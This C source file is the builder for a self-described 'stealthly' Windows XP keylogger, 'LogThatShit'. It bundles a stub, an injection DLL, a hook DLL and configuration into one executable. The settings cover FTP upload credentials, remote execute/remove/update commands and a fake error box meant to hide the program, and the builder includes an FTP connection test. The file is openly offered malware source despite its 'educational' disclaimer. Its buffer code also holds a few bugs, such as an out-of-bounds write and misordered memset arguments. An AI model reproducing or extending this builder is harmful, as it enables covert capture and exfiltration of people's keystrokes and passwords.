
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.



// TODO
// XXX Check variables for invalid characters, slash.. 

// XXX Instead of just exec, create special file for opening files via 
//        default viewer. lts_shell ShellExecute() for example. 
		
// XXX Filter window caption / program path 



#include <stdio.h> 
#include <stdlib.h> 
#include <ctype.h> 
#include <string.h> 
#include <windows.h> 
#include <wininet.h> 
#include "Common.h" 


char* General[] = {"GENERAL", "ALIAS", "PATH", "FILENAME", "LOGNAME", "INJECTNAME", "HOOKNAME"}; 
char* Remote[] = {"REMOTE", "EXEC", "REMOVE", "UPDATE"}; 
char* Log[] = {"LOG", "MAXLOGSIZE", "LOGCHECKINT"}; 
char* Ftp[] = {"FTP", "ROOT", "HOST", "USER", "PASS"}; 
char* Misc[] = {"MISC", "FAKEERROR", "ERRMSG", "ERRCAP"}; 
char hookpath[MAX_PATH+1]; 
char injectionpath[MAX_PATH+1]; 

/*
int Alphanumeric(const char* data, unsigned int sz) { 
	unsigned int i; 
	for (i=0; i<sz; ++i) 
		if (!isalpha(data[i])) return 0; 
	return 1; 
	if (i!=2) if (!Alphanumeric(buf, 260)) 
		printf("*** WARNING: %s under %s contains non-alphanumeric characters!\n", General[i], General[0]); 
} 
*/

unsigned int OutputBlock(FILE* fp, const char* const ini) { 
	/* Return block size. */ 
	char buf[261]; 
	char pair[281]; 
	unsigned int i; 
	unsigned int sz; 

	puts("*** Writing block.."); 

	/* The safety NUL. I don't trust other functions to put the NUL. */ 
	buf[261] = '\0'; 
	sz = 0; 

	/* GENERAL */ 
	for (i = 1; i < 7; ++i) { 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(General[0], General[i], "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for %s under %s\n", General[i], General[0]); 
		snprintf(pair, 280, "%s=%s", General[i], buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 
	} 

	/* REMOTE */ 
	for (i = 1; i < 4; ++i) { 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(Remote[0], Remote[i], "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for %s under %s\n", Remote[i], Remote[0]); 
		snprintf(pair, 280, "%s=%s", Remote[i], buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 
	} 

	/* FTP */ 
	for (i = 1; i < 5; ++i) { 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(Ftp[0], Ftp[i], "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for %s under %s\n", Ftp[i], Ftp[0]); 
		snprintf(pair, 280, "%s=%s", Ftp[i], buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 
	} 

	/* LOG */ 
	for (i = 1; i < 3; ++i) { 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(Log[0], Log[i], "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for %s under %s\n", Log[i], Log[0]); 
		snprintf(pair, 280, "%s=%s", Log[i], buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 
	} 

	/* MISC */ 
	GetPrivateProfileString(Misc[0], "FAKEERROR", "", buf, 2, ini); 
	if (buf[0]=='1') { 
		/* Fake error msg box is enabled. */ 
		snprintf(pair, 280, "FAKEERROR=1"); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 

		/* Get the error msg. */ 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(Misc[0], "ERRMSG", "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for ERRMSG under MISC\n"); 
		snprintf(pair, 280, "ERRMSG=%s", buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 

		/* Get the error caption. */ 
		memset(buf, 260, '\0'); 
		GetPrivateProfileString(Misc[0], "ERRCAP", "", buf, 260, ini); 
		if (!buf[0]) printf("*** WARNING: Missing value for ERRCAP under MISC\n"); 
		snprintf(pair, 280, "ERRCAP=%s", buf); 
		pair[280] = '\0'; 
		sz += fwrite(pair, 1, strlen(pair)+1, fp); 
	} 

	return sz; 
} 


void OutputDataStruct(FILE* fp, const char* const ini, unsigned int blocksz) { 
	FILE* f; 
	LTSData data; 
	char buf[2]; 

	puts("*** Writing data.."); 

	/* Flags */ 
	data.flags = 0; 
	GetPrivateProfileString(Log[0], "LOGTITLE", "0", buf, 2, ini); 
	if (*buf=='1') data.flags |= 1; 
	GetPrivateProfileString(Log[0], "LOGTITLECHANGE", "0", buf, 2, ini); 
	if (*buf=='1') data.flags |= 2; 
	GetPrivateProfileString(Log[0], "LOGPATH", "0", buf, 2, ini); 
	if (*buf=='1') data.flags |= 4; 
	GetPrivateProfileString(Log[0], "LOGTIMESTAMP", "0", buf, 2, ini); 
	if (*buf=='1') data.flags |= 8; 
/*	printf("Flags=%u\n", member); */ 

	/* Injection size */ 
	f = fopen(injectionpath, "rb"); 
	fseek(f, 0, SEEK_END); 
	data.injectsz = ftell(f); 
	fclose(f); 

	/* Hook size */ 
	f = fopen(hookpath, "rb"); 
	fseek(f, 0, SEEK_END); 
	data.hooksz = ftell(f); 
	fclose(f); 

	/* Block size */ 
	data.blocksz = blocksz; 

	fwrite(&data, sizeof(LTSData), 1, fp); 
} 


void FtpTest(const char* const ini) { 
	/* Test out the FTP settings in the INI file. */ 
	HINTERNET inet; 
	HINTERNET service; 
	char host[256]; 
	char user[64]; 
	char pass[64]; 

	/* Read settings from INI */ 
	GetPrivateProfileString("FTP", "HOST", "", host, 256, ini); 
	GetPrivateProfileString("FTP", "USER", "", user, 64, ini); 
	GetPrivateProfileString("FTP", "PASS", "", pass, 64, ini); 
	printf("."); 

	/* Attempt connecting to the FTP. */ 
	inet = InternetOpen("", INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!inet) {
		fprintf(stderr, "\n*** ERROR: Unable to open an internet session. Please check your connection/FTP settings and try again.\n"); 
		system("pause"); 
		exit(1); 
	} 
	printf("."); 

	service = InternetConnect(inet, \
									host, \
									INTERNET_INVALID_PORT_NUMBER, \
									user, \
									pass, \
									INTERNET_SERVICE_FTP, 0, 0); 
	if (!service) {
		fprintf(stderr, "\n*** ERROR: Unable to establish a connection to the FTP site. Please check your FTP settings.\n"); 
		system("pause"); 
		exit(1); 
	} 
	printf("."); 

	/* Success! Clean up. */ 
	InternetCloseHandle(inet); 
	InternetCloseHandle(service); 
	puts("\n*** FTP settings are OK."); 
} 


int main() { 
	FILE* output; 
	FILE* file; 
	char buf[1024]; 
	char outputpath[MAX_PATH+1]; 
	int rlen; 
	char* ini = "./LogThatShit.ini"; 

	/* Check if we should test out the FTP settings. */ 
	GetPrivateProfileString("BUILD", "FTPTEST", "", buf, 2, ini); 
	if (buf[0]=='1') {
		printf("*** Checking FTP settings..."); 
		FtpTest(ini); 
	} 


	/* Write stub and DLLS to output file. */ 
	puts("*** Opening files for I/O..."); 
	GetPrivateProfileString("BUILD", "OUTPUT", "", outputpath, MAX_PATH, ini); 
	if (!outputpath[0]) {
		fprintf(stderr, "*** ERROR: Missing or invalid output path. Please check LogThatShit.ini"); 
		system("pause"); 
		return 1; 
	} 
	outputpath[MAX_PATH] = '\0'; 
	output = fopen(outputpath, "wb"); 
	if (!output) { 
		fprintf(stderr, "*** ERROR: Unable to open outfile file \"%s\".\n", outputpath); 
		system("pause"); 
		return 1; 
	} 


	puts("*** Writing stub..."); 
	GetPrivateProfileString("BUILD", "STUB", "", buf, MAX_PATH, ini); 
	if (!buf[0]) { 
		fprintf(stderr, "*** ERROR: Missing or invalid stub path. Please check LogThatShit.ini\n"); 
		system("pause"); 
		return 1; 
	} 
	file = fopen(buf, "rb"); 
	if (!file) { 
		fprintf(stderr, "*** ERROR: Unable to open stub \"%s\".\n", buf); 
		fclose(output); 
		system("pause"); 
		return 1; 
	} 

	while ((rlen = fread(buf, 1, 1024, file)) > 0) 
		fwrite(buf, 1, rlen, output); 
	fclose(file); 


	puts("*** Writing injection..."); 
	GetPrivateProfileString("BUILD", "INJECTION", "", injectionpath, MAX_PATH, ini); 
	if (!injectionpath[0]) { 
		fprintf(stderr, "*** ERROR: Missing or invalid stub path. Please check LogThatShit.ini\n"); 
		system("pause"); 
		return 1; 
	} 
	file = fopen(injectionpath, "rb"); 
	if (!file) { 
		fprintf(stderr, "*** ERROR: Unable to open injection DLL. Make sure it's in the same path as this app and try again.\n"); 
		fclose(output); 
		system("pause"); 
		return 1; 
	} 

	while ((rlen = fread(buf, 1, 1024, file)) > 0) 
		fwrite(buf, 1, rlen, output); 
	fclose(file); 
 

	puts("*** Writing hook..."); 
	GetPrivateProfileString("BUILD", "HOOK", "", hookpath, MAX_PATH, ini); 
	if (!hookpath[0]) { 
		fprintf(stderr, "*** ERROR: Missing or invalid hook path. Please check LogThatShit.ini\n"); 
		system("pause"); 
		return 1; 
	} 
	file = fopen(hookpath, "rb"); 
	if (!file) { 
		fprintf(stderr, "*** ERROR: Unable to open hook DLL \"%s\".\n", hookpath); 
		fclose(output); 
		system("pause"); 
		return 1; 
	}

	while ((rlen = fread(buf, 1, 1024, file)) > 0) 
		fwrite(buf, 1, rlen, output); 
	fclose(file); 

	/* Write key/value pair from the ini file to the output file. */ 
	OutputDataStruct(output, ini, OutputBlock(output, ini)); 

	/* Write the signature. */ 
	puts("*** Writing signature.."); 
	fwrite("LTS", 1, 3, output); 

	/* Clean up and notify user that we have successfully finished. */ 
	fclose(output); 
	printf("\n*** Successfully generated \"%s\"\n", outputpath); 
	system("pause"); 
	return 0; 
}


